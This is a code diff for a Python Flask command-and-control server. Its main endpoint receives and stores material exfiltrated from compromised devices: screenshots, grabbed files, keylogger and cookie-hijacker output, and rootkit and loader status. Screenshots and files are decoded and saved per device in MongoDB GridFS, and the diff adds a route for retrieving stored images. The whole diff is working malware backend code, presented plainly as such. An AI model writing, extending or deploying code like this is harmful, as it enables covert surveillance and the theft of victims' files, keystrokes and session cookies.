@@ -262,163 +262,161 @@ def send_command():
         return jsonify({'status': 'error', 'message': 'No commands in queue'}), 200
 
 
-
 #get artifacts    
-@app.route('/c2/send_artifact', methods=['POST'])
+@app.route('/c2/send_artifact/', methods=['POST'])
 def receive_artifact():
-    data = request.json
-
-    # Extract the keys for identifying the type of artifact
-    artifact_types = ['SCREEN_SHOOTER', 'FILE_GRABBER', 'KEYLOGGER', 'COOKIE_HIJACKER', 'ROOTKIT']
-    artifact_type = next((key for key in artifact_types if key in data), None)
-    
-    if not artifact_type:
-        return jsonify({'status': 'error', 'message': 'No valid artifact type provided'}), 400
-    
-    artifact_data = data.get(artifact_type, [])
-    activity_id = data.get('activity_id')
-    client_id = data.get('client_id')
-
-    if not activity_id:
-        return jsonify({'status': 'error', 'message': 'Activity ID not provided'}), 400
-
-    last_activity = last_activity_collection.find_one({'_id': activity_id})
-
-    if not last_activity:
-        return jsonify({'status': 'error', 'message': 'Activity ID not found'}), 404
-
-    device_name = last_activity.get('device')
-    artifact_collection_name = f'artifacts_{device_name}'
-    artifact_collection = db[artifact_collection_name]
-
-    responses = []
-    status_update = 'success'
-
-    if artifact_type == 'SCREEN_SHOOTER':
-        if isinstance(artifact_data, list) and len(artifact_data) > 0:
-            artifact_data = artifact_data[0]  # Get the first item from the list
-
-        screenshot_base64 = artifact_data.get('data')  # Assuming 'data' is the key
-
-        if screenshot_base64 is None:
-            last_activity_collection.update_one(
-                {'_id': activity_id},
-                {'$set': {'status': 'failure'}}
-            )
-            return jsonify({'status': 'error', 'message': 'The screenshot key is not found in the JSON file.'}), 400
+    try:
+        data = request.json
+        print(type(data))  # dict
         
-        try:
-            existing_files = fs.find({'filename': {'$regex': f'^{artifact_type}_\\d+\\.png$'}})
-            latest_number = max([int(re.search(r'_(\d+)\.png$', file.filename).group(1)) for file in existing_files], default=0)
-            new_number = latest_number + 1
-            file_name = f"{artifact_type}_{new_number}.png"
-            
-            screenshot_data = base64.b64decode(screenshot_base64)
-            fs.put(io.BytesIO(screenshot_data), filename=file_name)
-
-            artifact_record = {
-                'client_id': client_id,
-                'activity_id': activity_id,
-                'device': device_name,
-                'artifact_type': artifact_type,
-                'file_name': file_name,
-                'content': screenshot_base64,
-                'created_at': datetime.now()
-            }
-            artifact_collection.insert_one(artifact_record)
-            responses.append({'file_name': file_name, 'status': 'saved'})
+        # Extract the keys for identifying the type of artifact
+        artifact_type = None
+        for at in ['SCREEN_SHOOTER', 'FILE_GRABBER', 'KEYLOGGER', 'COOKIE_HIJACKER', 'ROOTKIT', 'LOADER']:
+            if at in data:
+                artifact_type = at
+                break
         
-        except Exception as e:
-            last_activity_collection.update_one(
-                {'_id': activity_id},
-                {'$set': {'status': 'failure'}}
-            )
-            return jsonify({'status': 'error', 'message': f'Failed to insert artifact into database: {str(e)}'}), 500
+        if artifact_type is None:
+            app.logger.error('No valid artifact type provided')
+            return jsonify({'status': 'error', 'message': 'No valid artifact type provided'}), 400
+        
+        artifact_data = data.get(artifact_type, [])
+        print(type(artifact_data))  # list or dict
+        activity_id = data.get('activity_id')
+        print(activity_id)
+        client_id = data.get('client_id')
+        print(client_id)
 
-    elif artifact_type == 'FILE_GRABBER':
-        file_grabber_entries = artifact_data if isinstance(artifact_data, list) else [artifact_data]
+        if not activity_id:
+            app.logger.error('Activity ID not provided')
+            return jsonify({'status': 'error', 'message': 'Activity ID not provided'}), 400
 
-        for file_grabber_data in file_grabber_entries:
-            result = file_grabber_data.get('result')
-            error = file_grabber_data.get('error')
-            zip_base64 = file_grabber_data.get('data')
+        last_activity = last_activity_collection.find_one({'_id': activity_id})
 
-            if result == 'failure':
-                last_activity_collection.update_one(
-                    {'_id': activity_id},
-                    {'$set': {'status': 'failure'}}
-                )
-                return jsonify({'status': 'error', 'message': f'File grabber failed with error: {error}'}), 400
+        if not last_activity:
+            app.logger.error('Activity ID not found')
+            return jsonify({'status': 'error', 'message': 'Activity ID not found'}), 404
 
-            if not zip_base64:
-                last_activity_collection.update_one(
-                    {'_id': activity_id},
-                    {'$set': {'status': 'failure'}}
-                )
-                return jsonify({'status': 'error', 'message': 'The zip_file data is empty.'}), 400
+        device_name = last_activity.get('device')
+        artifact_collection_name = f'artifacts_{device_name}'
+        artifact_collection = db[artifact_collection_name]
 
-            try:
-                zip_data = base64.b64decode(zip_base64)
-                with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zip_file:
-                    for file_info in zip_file.infolist():
-                        if file_info.is_dir() or file_info.filename.endswith('.zip'):
-                            continue  # Skip directories and ZIP files
-                        
-                        file_name = file_info.filename
-                        file_data = zip_file.read(file_info)
-                        fs.put(io.BytesIO(file_data), filename=file_name)
+        responses = []
+        status_update = 'success'
 
-                        artifact_record = {
-                            'client_id': client_id,
-                            'activity_id': activity_id,
-                            'device': device_name,
-                            'artifact_type': artifact_type,
-                            'file_name': file_name,
-                            'content': base64.b64encode(file_data).decode('utf-8'),
-                            'created_at': datetime.now()
-                        }
-                        artifact_collection.insert_one(artifact_record)
-                        responses.append({'file_name': file_name, 'status': 'saved'})
+        if artifact_type == 'SCREEN_SHOOTER':
+            # Handle SCREEN_SHOOTER artifacts
+            if isinstance(artifact_data, list) and len(artifact_data) > 0:
+                print("ok")
+                screenshot_base64 = artifact_data[0]
+                #artifact_data = artifact_data[0]  # Get the first dictionary from the list
+                #data_value = artifact_data.get('data')
+                #error_value = artifact_data.get('error')
+                #result_value = artifact_data.get('result')
+                print(screenshot_base64)
 
-            except Exception as e:
-                last_activity_collection.update_one(
-                    {'_id': activity_id},
-                    {'$set': {'status': 'failure'}}
-                )
-                return jsonify({'status': 'error', 'message': f'Failed to process zip file: {str(e)}'}), 500
+                if screenshot_base64 is None:
+                    app.logger.error('The screenshot data is empty or missing.')
+                    last_activity_collection.update_one(
+                        {'_id': activity_id},
+                        {'$set': {'status': 'failure'}}
+                    )
+                    return jsonify({'status': 'error', 'message': 'The screenshot data is empty or missing.'}), 400
 
-    elif artifact_type == 'ROOTKIT':
-        rootkit_entries = artifact_data if isinstance(artifact_data, list) else [artifact_data]
+                try:
+                    existing_files = fs.find({'filename': {'$regex': f'^{artifact_type}_\\d+\\.png$'}})
+                    latest_number = max([int(re.search(r'_(\d+)\.png$', file.filename).group(1)) for file in existing_files], default=0)
+                    new_number = latest_number + 1
+                    file_name = f"{artifact_type}_{new_number}.png"
+                    
+                    screenshot_data = base64.b64decode(screenshot_base64)
+                    fs.put(io.BytesIO(screenshot_data), filename=file_name)
 
-        for rootkit_data in rootkit_entries:
-            result = rootkit_data.get('result')
-            error = rootkit_data.get('error')
-
-            if result == 'failure':
-                last_activity_collection.update_one(
-                    {'_id': activity_id},
-                    {'$set': {'status': 'failure'}}
-                )
-                return jsonify({'status': 'error', 'message': f'Rootkit scan failed with error: {error}'}), 400
-
-            if result == 'success':
-                responses.append({'status': 'success', 'message': 'Rootkit scan succeeded'})
+                    artifact_record = {
+                        'client_id': client_id,
+                        'activity_id': activity_id,
+                        'device': device_name,
+                        'artifact_type': artifact_type,
+                        'file_name': file_name,
+                        'content': screenshot_base64,
+                        'created_at': datetime.now()
+                    }
+                    artifact_collection.insert_one(artifact_record)
+                    responses.append({'file_name': file_name, 'status': 'saved'})
+                
+                except Exception as e:
+                    app.logger.error(f'Failed to insert artifact into database: {str(e)}')
+                    last_activity_collection.update_one(
+                        {'_id': activity_id},
+                        {'$set': {'status': 'failure'}}
+                    )
+                    return jsonify({'status': 'error', 'message': f'Failed to insert artifact into database: {str(e)}'}), 500
             else:
-                # Handle unexpected result values if necessary
-                last_activity_collection.update_one(
-                    {'_id': activity_id},
-                    {'$set': {'status': 'failure'}}
-                )
-                return jsonify({'status': 'error', 'message': 'Unexpected result value for ROOTKIT'}), 400
+                app.logger.error('Invalid data format for SCREEN_SHOOTER')
+                return jsonify({'status': 'error', 'message': 'Invalid data format for SCREEN_SHOOTER'}), 400
 
-    #Additional handling for other artifact types (KEYLOGGER, COOKIE_HIJACKER) can be added here
+        elif artifact_type == 'ROOTKIT':
+            # Handle ROOTKIT artifacts
+            rootkit_entries = artifact_data if isinstance(artifact_data, list) else [artifact_data]
 
-    last_activity_collection.update_one(
-        {'_id': activity_id},
-        {'$set': {'status': status_update}}
-    )
+            for rootkit_data in rootkit_entries:
+                if not isinstance(rootkit_data, dict):
+                    app.logger.error('Invalid data format for ROOTKIT')
+                    last_activity_collection.update_one(
+                        {'_id': activity_id},
+                        {'$set': {'status': 'failure'}}
+                    )
+                    return jsonify({'status': 'error', 'message': 'Invalid data format for ROOTKIT'}), 400
 
-    return jsonify({'status': 'success', 'responses': responses})
+                result = rootkit_data.get('result')
+                error = rootkit_data.get('error')
+
+                if result == 'failure':
+                    app.logger.error(f'Rootkit scan failed with error: {error}')
+                    last_activity_collection.update_one(
+                        {'_id': activity_id},
+                        {'$set': {'status': 'failure'}}
+                    )
+                    return jsonify({'status': 'error', 'message': f'Rootkit scan failed with error: {error}'}), 400
+
+                if result == 'success':
+                    responses.append({'status': 'success', 'message': 'Rootkit scan succeeded'})
+                else:
+                    app.logger.error('Unexpected result value for ROOTKIT')
+                    last_activity_collection.update_one(
+                        {'_id': activity_id},
+                        {'$set': {'status': 'failure'}}
+                    )
+                    return jsonify({'status': 'error', 'message': 'Unexpected result value for ROOTKIT'}), 400
+
+        else:
+            # Handle other artifact types
+            if not isinstance(artifact_data, dict):
+                app.logger.error(f'Invalid data format for {artifact_type}')
+                status_update = 'failure'
+            else:
+                error_message = artifact_data.get('error', '')
+                result = artifact_data.get('result', 'failure')
+                
+                if error_message:
+                    status_update = 'failure'
+                elif result == 'success':
+                    status_update = 'success'
+                else:
+                    status_update = 'failure'
+        
+        last_activity_collection.update_one(
+            {'_id': activity_id},
+            {'$set': {'status': status_update}}
+        )
+
+        return jsonify({'status': 'success', 'responses': responses})
+
+    except Exception as e:
+        app.logger.error(f'Unhandled exception: {str(e)}')
+        return jsonify({'status': 'error', 'message': f'Unhandled exception: {str(e)}'}), 500
+
+
 
 
 #server (front) API 
@@ -617,6 +615,21 @@ def get_artifacts(device_name):
     except Exception as e:
         print(f'Error retrieving artifacts for {device_name}: {e}')
         return jsonify({'error': 'Failed to retrieve artifacts'}), 500
+
+#get image fridFS - work 
+@app.route('/image/<file_id>')
+def get_image(file_id):
+    try:
+        file = fs.find_one({'_id': ObjectId(file_id)})
+        if not file:
+            return jsonify({'error': 'File not found'}), 404
+
+        return send_file(io.BytesIO(file.read()), mimetype='image/png')
+    except Exception as e:
+        return jsonify({'error': f'Failed to retrieve file: {str(e)}'}), 500
+
+
+
 
 @app.route('/delete_campaign/<device_name>', methods=['POST'])
 def delete_campaign(device_name):
